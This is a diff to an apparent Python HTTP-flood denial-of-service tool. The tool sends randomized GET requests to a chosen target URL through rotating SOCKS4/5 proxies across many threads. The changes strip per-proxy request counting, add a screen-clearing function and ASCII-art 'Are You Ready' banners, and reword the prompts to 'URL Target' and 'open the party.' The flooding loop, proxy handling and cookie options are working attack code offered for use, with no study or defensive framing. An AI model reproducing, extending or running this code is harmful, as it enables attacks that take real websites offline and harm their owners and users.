@@ -6,6 +6,8 @@ import threading
 import sys
 import ssl
 import datetime
+import os
+
 
 
 acceptall = [
@@ -201,7 +203,7 @@ def CheckerOption():
 	if len(proxies) == 0:
 		print("	[+]  There are no more proxies. Please download a new one.")
 		sys.exit(1)
-	print ("	[+]  Number Of Socks%s Proxies: %s" %(choice,len(proxies)))
+	print ("	[+]  Total Socks%s Proxies: %s" %(choice,len(proxies)))
 	time.sleep(0.03)
 	ans = str(input("	[+]  Do u need to check the socks list?(y/n, defualt=y):"))
 	if ans == "":
@@ -217,40 +219,24 @@ def CheckerOption():
 				ms = float(ms)
 		check_socks(ms)
 
-def SetupIndDict():
-	global ind_dict
-	for proxy in proxies:
-		ind_dict[proxy.strip()] = 0
 
 def OutputToScreen(ind_rlock):
-	global ind_dict
 	i = 0
 	sp_char = ["|","/","-","\\"]
 	while 1:
 		if i > 3:
 			i = 0
-		print(format("	[+]  Attack  [+]  "))
-		ind_rlock.acquire()
-		top_num = 0
-		top10= sorted(ind_dict, key=ind_dict.get, reverse=True)
-		if len(top10) > 10:
-			top_num = 10
-		else:
-			top_num = len(top10)
-		for num in range(top_num):
-			top = "none"
-			rps = 0
-			if len(ind_dict) != 0:
-				top = top10[num]
-				rps = ind_dict[top]
-				ind_dict[top] = 0
-		total = 0
-		for k,v in ind_dict.items():
-			total = total + v
-			ind_dict[k] = 0
-		ind_rlock.release()
-		i+=1
-		time.sleep(1)
+		print(format("	[+]  Attack: "+createRequest()+" [+]  "))
+
+def createRequest():
+	header = GenReqHeader("get")
+	add = "?"
+	if "?" in path:
+		add = "&"
+	get_host = "GET " + path + add + randomurl() + " HTTP/1.1\r\nHost: " + target + "\r\n"
+	request = get_host + header
+	return request
+
 
 def cc(event,socks_type,ind_rlock):
 	global ind_dict
@@ -267,8 +253,8 @@ def cc(event,socks_type,ind_rlock):
 				s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
 			if socks_type == 5:
 				s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
-			if brute:
-				s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+			# if brute:
+			# 	s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
 			s.connect((str(target), int(port)))
 			if protocol == "https":
 				ctx = ssl.SSLContext()
@@ -278,18 +264,9 @@ def cc(event,socks_type,ind_rlock):
 					get_host = "GET " + path + add + randomurl() + " HTTP/1.1\r\nHost: " + target + "\r\n"
 					request = get_host + header
 					sent = s.send(str.encode(request))
-					if not sent:
-						ind_rlock.acquire()
-						ind_dict[(proxy[0]+":"+proxy[1]).strip()] += n
-						ind_rlock.release()
-						proxy = Choice(proxies).strip().split(":")
-						break
 				s.close()
 			except:
 				s.close()
-			ind_rlock.acquire()
-			ind_dict[(proxy[0]+":"+proxy[1]).strip()] += multiple+1
-			ind_rlock.release()
 		except:
 			s.close()
 
@@ -382,7 +359,13 @@ def prevent():
 	if '.gov' in url :
 		print("	[+] You can't attack .gov website!")
 		exit()
-	
+
+def clearConsole():
+    command = 'clear'
+    if os.name in ('nt', 'dos'):  # If Machine is running on Windows, use cls
+        command = 'cls'
+    os.system(command)
+
 def main():
 	global multiple
 	global choice
@@ -392,10 +375,10 @@ def main():
 	global brute
 	global url
 	mode = "cc"
-	url = str(input("	[+] URL:")).strip()
+	url = str(input("	[+] URL Target:")).strip()
 	prevent()
 	ParseUrl(url)
-	choice2 = InputOption("	[+] Customize cookies? (y/n, default=n):",["y","n","yes","no"],"n")
+	choice2 = InputOption("	[+] Cookies? (y/n, default=n):",["y","n","yes","no"],"n")
 	if choice2 == "y":
 		cookies = str(input("Plese input the cookies:")).strip()
 	choice = InputOption("	[+] Choose your socks mode(4/5, default=5):",["4","5"],"5")
@@ -431,11 +414,45 @@ def main():
 	elif brute == "n":
 		brute = False
 	event = threading.Event()
-	print("	[+] Building threads...")
-	SetupIndDict()
+	clearConsole()
+	print("""\
+			          .                                                      .
+			        .n                   .                 .                  n.
+			  .   .dP                  dP                   9b                 9b.    .
+			 4    qXb         .       dX                     Xb       .        dXp     t
+			dX.    9Xb      .dXb    __                         __    dXb.     dXP     .Xb
+			9XXb._       _.dXXXXb dXXXXbo.                 .odXXXXb dXXXXb._       _.dXXP
+			 9XXXXXXXXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXXXXXP
+			  `9XXXXXXXXXXXXXXXXXXXXX'~   ~`OOO8b   d8OOO'~   ~`XXXXXXXXXXXXXXXXXXXXXP'
+			    `9XXXXXXXXXXXP' `9XX'          `98v8P'          `XXP' `9XXXXXXXXXXXP'
+			        ~~~~~~~       9X.          .db|db.          .XP       ~~~~~~~
+			                        )b.  .dbo.dP'`v'`9b.odb.  .dX(
+			                      ,dXXXXXXXXXXXb     dXXXXXXXXXXXb.
+			                     dXXXXXXXXXXXP'   .   `9XXXXXXXXXXXb
+			                    dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb
+			                    9XXb'   `XXXXXb.dX|Xb.dXXXXX'   `dXXP
+			                     `'      9XXXXXX(   )XXXXXXP      `'
+			                              XXXX X.`v'.X XXXX
+			                              XP^X'`b   d'`X^XX
+			                              X. 9  `   '  P )X
+			                              `b  `       '  d'
+	""")
+	print("""\
+	  /$$$$$$                            /$$     /$$                        /$$$$$$$                            /$$          
+	 /$$__  $$                          |  $$   /$$/                       | $$__  $$                          | $$          
+	| $$  \ $$  /$$$$$$   /$$$$$$        \  $$ /$$//$$$$$$  /$$   /$$      | $$  \ $$  /$$$$$$   /$$$$$$   /$$$$$$$ /$$   /$$
+	| $$$$$$$$ /$$__  $$ /$$__  $$        \  $$$$//$$__  $$| $$  | $$      | $$$$$$$/ /$$__  $$ |____  $$ /$$__  $$| $$  | $$
+	| $$__  $$| $$  \__/| $$$$$$$$         \  $$/| $$  \ $$| $$  | $$      | $$__  $$| $$$$$$$$  /$$$$$$$| $$  | $$| $$  | $$
+	| $$  | $$| $$      | $$_____/          | $$ | $$  | $$| $$  | $$      | $$  \ $$| $$_____/ /$$__  $$| $$  | $$| $$  | $$
+	| $$  | $$| $$      |  $$$$$$$          | $$ |  $$$$$$/|  $$$$$$/      | $$  | $$|  $$$$$$$|  $$$$$$$|  $$$$$$$|  $$$$$$$
+	|__/  |__/|__/       \_______/          |__/  \______/  \______/       |__/  |__/ \_______/ \_______/ \_______/ \____  $$
+	                                                                                                                /$$  | $$
+	                                                                                                               |  $$$$$$/
+	                                                                                                                \______/ 
+	""")
 	build_threads(mode,thread_num,event,socks_type,ind_rlock)
 	event.clear()
-	input("	[+] Press Enter to continue.")
+	input("	[+] Press Enter to open the party.")
 	event.set()
 	threading.Thread(target=OutputToScreen,args=(ind_rlock,),daemon=True).start()
 	while True:
@@ -443,6 +460,7 @@ def main():
 			time.sleep(0.1)
 		except KeyboardInterrupt:
 			break
+
 	
 
 if __name__ == "__main__":
